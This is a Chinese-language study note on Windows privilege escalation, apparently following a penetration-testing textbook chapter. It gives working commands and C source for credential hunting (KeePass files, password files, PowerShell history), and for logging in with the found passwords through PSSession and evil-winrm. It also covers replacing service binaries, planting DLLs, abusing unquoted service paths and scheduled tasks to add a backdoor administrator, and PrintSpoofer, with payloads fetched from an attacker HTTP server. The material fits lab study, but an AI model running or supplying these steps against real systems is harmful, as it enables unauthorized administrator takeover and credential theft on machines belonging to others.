本篇对应教材第16章，主要内容“Windows提权信息枚举”、“利用Windows服务”、“利用其他Windows组件”，记录使用工具和命令

## 16.1 Windows提权信息枚举

### 16.1.2 基本信息枚举

查看当前用户和组

```armasm
whoami
whoami /groups
```

```armasm
powershell
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember adminteam
Get-LocalGroupMember Administrators
```

查看系统信息

```armasm
systeminfo
```

查看网络和路由信息

```armasm
ipconfig /all
route print
netstat -ano
```

查看软件安装信息（32位和64位）

```armasm
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

查看当前进程

```armasm
Get-Process
```

### 16.1.3 密码明文存储

查找密码文件，关注常见的密码文件

```armasm
.kdbx -- keepass的密码存储文件
type C:\xampp\passwords.txt
type C:\xampp\mysql\bin\my.ini
cat Desktop\asdf.txt
```

```armasm
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```

获得密码后可以运行用户下的cmd

```armasm
PS C:\Users\steve> runas /user:backupadmin cmd
```

### 16.1.4 powershell历史记录

查看历史

```armasm
Get-History
```

历史文件位置

```armasm
(Get-PSReadlineOption).HistorySavePath
```

查看历史文件

```armasm
type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

历史文件中找到敏感文件

```armasm
type C:\Users\Public\Transcripts\transcript01.txt
```

敏感文件里有密码和session连接信息，使用信息进行session连接

```armasm
$password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
whoami
```

PSSession下执行命令可能没有回显，使用winrm，主要密码中特殊字符需要转译

```armasm
evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"
```

### 16.1.5 自动枚举

winpeas

```armasm
cp /usr/share/peass/winpeas/winPEASx64.exe .
python3 -m http.server 80

powershell
iwr -uri http://192.168.118.2/winPEASx64.exe -Outfile winPEAS.exe
.\winPEAS.exe
```

## 16.2 利用Windows服务

### 16.2.1 服务二进制文件劫持

查看服务

```armasm
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

查看服务的二进制文件访问权限

```armasm
icacls "C:\xampp\apache\bin\httpd.exe"
icacls "C:\xampp\mysql\bin\mysqld.exe"
```

|Mask掩模|Permissions权限|
| ----------| ---------------------------------------|
|F|Full access完全访问权限|
|M|Modify access修改访问|
|RX|Read and execute access读取和执行访问|
|R|Read-only access只读访问|
|W|Write-only access只写存取|

关注F和W权限的

创建添加用户程序

```armasm
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```

编译

```armasm
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

下载替换文件

```armasm
iwr -uri http://192.168.119.3/adduser.exe -Outfile adduser.exe
move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
```

重启服务

```armasm
net stop mysql
```

如果没有权限，可以看看服务是不是开机自启，如果是就看看是不是可以重启机器

```armasm
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
whoami /priv
有SeShutdownPrivilege就可以重启

shutdown /r /t 0

重启后查看用户
Get-LocalGroupMember administrators
```

也可以使用自动化工具PowerUp.ps1

```armasm
cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
python3 -m http.server 80

iwr -uri http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1
powershell -ep bypass
. .\PowerUp.ps1
Get-ModifiableServiceFile
Install-ServiceBinary -Name 'mysql'
```

报错，有时不能盲目相信自动化工具，需要手动利用。

### 16.2.2 服务DLL劫持

枚举服务

```armasm
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

查看二进制文件权限

```armasm
icacls .\Documents\BetaServ.exe
```

可读可执行，不能替换，使用Procmon64.exe查看进程调用dll情况

点击Filter添加过滤规则

```armasm
Process Name is BetaServ.exe 
```

然后重启服务

```armasm
Restart-Service BetaService
```

看到多次调用myDLL.dll

查看环境变量

```armasm
PS C:\Users\steve> $env:path
C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\steve\AppData\Local\Microsoft\WindowsApps;
```

在第一个调用路径上放置dll文件

```armasm
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user dave2 password123! /add");
  	    i = system ("net localgroup administrators dave2 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

编译

```armasm
x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
```

放置在一个调用路径，需要是一个可写目录，如：

```armasm
C:\Users\steve\Documents 
```

```armasm
cd Documents
iwr -uri http://192.168.119.3/myDLL.dll -Outfile myDLL.dll
net user
```

重启服务，dll被加载，代码被运行

```armasm
Restart-Service BetaService
net user
net localgroup administrators
```

添加管理员成功

### 16.2.3 无引号文件路径

路径中存在空格时且路径没有被引号包裹，文件执行顺序如下：

```armasm
C:\Program Files\My Program\My Service\service.exe
顺序：
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Program\My.exe
C:\Program Files\My Program\My service\service.exe
```

枚举服务和路径信息（powershell）

```armasm
Get-CimInstance -ClassName win32_service | Select Name,State,PathName
```

枚举没有引号路径的服务（cmd）

```armasm
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
```

发现服务

```armasm
Name                                       PathName                                                                   
...                                                                                                       
GammaService                               C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
```

测试起是否可以被启动和停止

```armasm
Start-Service GammaService
Stop-Service GammaService
```

文件执行顺序

```armasm
C:\Program.exe
C:\Program Files\Enterprise.exe
C:\Program Files\Enterprise Apps\Current.exe
C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
```

检查路径是否可写

```armasm
icacls "C:\"
icacls "C:\Program Files"
icacls "C:\Program Files\Enterprise Apps"
```

需要有F或者W权限，如

```armasm
C:\Program Files\Enterprise Apps
```

```armasm
iwr -uri http://192.168.119.3/adduser.exe -Outfile Current.exe
copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'
Start-Service GammaService

net user
net localgroup administrators
```

自动化工具PowerUp

```armasm
iwr http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1
powershell -ep bypass
. .\PowerUp.ps1
Get-UnquotedService

Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"
Restart-Service GammaService
net user
net localgroup administrators
```

## 16.3 利用其他Windows组件

### 16.3.1 计划任务

查看

```armasm
schtasks /query /fo LIST /v
```

关注任务名、下一次执行时间、作者、文件路径等信息

查看是否可以替换

```armasm
icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe
```

替换

```armasm
iwr -Uri http://192.168.119.3/adduser.exe -Outfile BackendCacheCleanup.exe
move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak
move .\BackendCacheCleanup.exe .\Pictures\
```

等执行时间过后，查看

```armasm
net user
net localgroup administrators
```

### 16.3.2 使用漏洞

查看权限

```armasm
whoami /priv
```

有SeImpersonatePrivilege可以用PrintSpoofer或者土豆系列

```armasm
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
python3 -m http.server 80

powershell
iwr -uri http://192.168.119.2/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
.\PrintSpoofer64.exe -i -c powershell.exe
whoami
```

更多更新资料（微信公众号：TopRedTeam）

![](./qrcode.jpg)
